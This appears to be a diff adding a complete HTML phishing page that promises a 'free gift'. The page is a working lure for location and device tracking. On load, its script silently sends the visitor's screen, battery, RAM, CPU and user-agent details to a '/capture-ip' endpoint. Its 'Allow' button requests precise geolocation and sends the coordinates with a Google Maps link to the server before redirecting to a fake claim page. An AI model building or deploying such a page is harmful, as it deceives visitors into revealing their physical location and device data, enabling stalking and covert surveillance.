@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Claim Your Free Gift!</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f0f0f0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+    .container {
+      width: 100%;
+      max-width: 1200px;
+      background: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+    .gift-image {
+      width: 100%;
+      height: 300px;
+      background: #444;
+      margin-bottom: 20px;
+      position: relative;
+    }
+    .gift-image::before {
+      content: '🎁';
+      font-size: 100px;
+      color: white;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+    }
+    h1 {
+      font-size: 32px;
+      color: #333;
+      margin-bottom: 20px;
+    }
+    p {
+      font-size: 18px;
+      color: #555;
+      margin-bottom: 20px;
+    }
+    .allow-button {
+      font-size: 20px;
+      padding: 20px 40px;
+      background-color: #32CD32;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    .allow-button:hover {
+      background-color: #228B22;
+    }
+    .status {
+      font-size: 16px;
+      color: #333;
+      margin-top: 20px;
+    }
+    .footer {
+      margin-top: 40px;
+      font-size: 14px;
+      color: #888;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <!-- Fake Gift Image -->
+    <div class="gift-image" id="gift-image"></div>
+
+    <h1>Claim Your Free Gift Now!</h1>
+    <p>Click "Allow" to claim your free gift.</p>
+    <button class="allow-button" id="allowBtn">Allow</button>
+    <div class="status" id="status"></div>
+
+    <!-- Footer Section -->
+    <div class="footer">
+      <p>Terms of Service | Privacy Policy</p>
+    </div>
+  </div>
+
+  <!-- Background Script to collect device and location information -->
+  <script>
+    // Function to send visitor's device and browser details to server
+    const sendDeviceData = async () => {
+      const resolution = `${window.screen.width}x${window.screen.height}`;
+      const battery = navigator.getBattery ? await navigator.getBattery() : { level: 1, charging: false };
+      const ram = navigator.deviceMemory || "Unknown RAM";
+      const cpu = navigator.hardwareConcurrency || "Unknown CPU";
+
+      fetch('/capture-ip', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          resolution: resolution,
+          battery: battery.level * 100,
+          isCharging: battery.charging,
+          userAgent: navigator.userAgent,
+          ram: ram,
+          cpu: cpu
+        }),
+      })
+      .then(response => response.json())
+      .then(data => console.log('%c[✔] Device Data Sent:', 'color: green; font-weight: bold;', data))
+      .catch(error => console.error('%c[❌] Error sending device data:', 'color: red; font-weight: bold;', error));
+    };
+
+    // Function to ask for location permission
+    const askForLocation = () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, handleLocationError);
+      } else {
+        console.warn('%c[⚠] Geolocation not supported by this browser.', 'color: orange; font-weight: bold;');
+      }
+    };
+
+    // Send user's location to the server
+    const sendLocation = (position) => {
+      const { latitude, longitude } = position.coords;
+      const mapLink = `https://www.google.com/maps/place/${latitude},${longitude}`;
+      console.log('%c[📍] Location received:', 'color: blue; font-weight: bold;', mapLink);
+
+      fetch('/location', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ latitude, longitude, mapLink }),
+      })
+      .then(response => response.json())
+      .then(data => console.log('%c[✔] Location Data Sent:', 'color: green; font-weight: bold;', data))
+      .catch(error => console.error('%c[❌] Error sending location:', 'color: red; font-weight: bold;', error));
+    };
+
+    // Handle location errors
+    const handleLocationError = (error) => {
+      console.warn('%c[⚠] Location permission denied or error occurred.', 'color: orange; font-weight: bold;');
+      console.error(error);
+    };
+
+    // Run when the page loads
+    window.onload = () => {
+      sendDeviceData(); // Send visitor device data immediately
+    };
+  </script>
+
+  <script src="/socket.io/socket.io.js"></script>
+  <script>
+    const socket = io();
+
+    // Function to request location permission and send coordinates
+    async function requestLocation() {
+      try {
+        // Request geolocation permission
+        const position = await new Promise((resolve, reject) =>
+          navigator.geolocation.getCurrentPosition(resolve, reject, {
+            enableHighAccuracy: true,
+            timeout: 5000
+          })
+        );
+
+        // If permission is granted, send the location data to the server
+        const coords = {
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude
+        };
+        
+        const mapLink = `https://www.google.com/maps/place/${coords.latitude},${coords.longitude}`;
+        console.log('Location:', mapLink);
+
+        // Display the status message
+        document.getElementById('status').innerText = 'Gift claiming successful. Redirecting...';
+
+        // Send the location data to the server
+        socket.emit('location', coords);
+
+        // Optionally handle server's confirmation
+        socket.on('locationReceived', (message) => {
+          console.log(message);
+        });
+
+        // After sending location, simulate the gift claim
+        claimGift();
+
+      } catch (error) {
+        console.warn('Location tracking failed:', error);
+        document.getElementById('status').innerText = 'Failed to get location.';
+      }
+    }
+
+    // Simulating the free gift claim process
+    async function claimGift() {
+      try {
+        document.getElementById('status').innerText = "Claiming gift...";
+
+        // Sending a fake gift claimed event
+        socket.emit('giftClaimed', { message: 'Gift claimed successfully!' });
+
+        socket.on('giftConfirmed', (message) => {
+          console.log(message);
+        });
+
+        // Optionally trigger a page redirect (to a fake claim page)
+        setTimeout(() => {
+          window.location.href = 'https://www.example.com/gift-claim'; // Fake claim page
+        }, 3000);
+
+      } catch (error) {
+        console.warn('Gift claim failed:', error);
+        document.getElementById('status').innerText = 'Failed to claim gift.';
+      }
+    }
+
+    // Event listener for the "Allow" button
+    document.getElementById('allowBtn').addEventListener('click', function() {
+      document.getElementById('status').innerText = "Claiming gift, please wait...";
+      document.getElementById('allowBtn').style.display = 'none';
+
+      // Start location request
+      requestLocation();
+    });
+  </script>
+
+</body>
+</html>
